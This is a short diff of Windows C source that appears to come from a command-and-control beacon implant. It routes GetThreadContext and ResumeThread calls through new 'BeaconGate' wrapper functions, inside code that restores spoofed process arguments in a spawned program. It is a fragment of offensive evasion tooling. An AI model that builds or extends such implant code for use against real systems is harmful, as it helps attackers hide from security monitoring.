@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "beacon.h"
 #include "commands.h"
 #include "functions.h"
@@ -37,7 +38,7 @@ BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
 
 	/* query some information from our remote thread */
 	ctx.ContextFlags = CONTEXT_INTEGER;
-	if (!GetThreadContext(pi->hThread, &ctx)) {
+	if (!gate_GetThreadContext(pi->hThread, &ctx)) {
 		post_error_d(0x41, GetLastError());
 		return FALSE;
 	}
@@ -97,7 +98,7 @@ BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
 
 	/* query some information from our remote thread */
 	ctx.ContextFlags = CONTEXT_INTEGER;
-	if (!GetThreadContext(pi->hThread, &ctx)) {
+	if (!gate_GetThreadContext(pi->hThread, &ctx)) {
 		post_error_d(0x41, GetLastError());
 		return FALSE;
 	}
@@ -275,7 +276,7 @@ BOOL execute_program(PROCESS_CONTEXT * ctx) {
 			return FALSE;
 		}
 		else {
-			ResumeThread(ctx->pi->hThread);
+			gate_ResumeThread(ctx->pi->hThread);
 		}
 		return result;
 	}
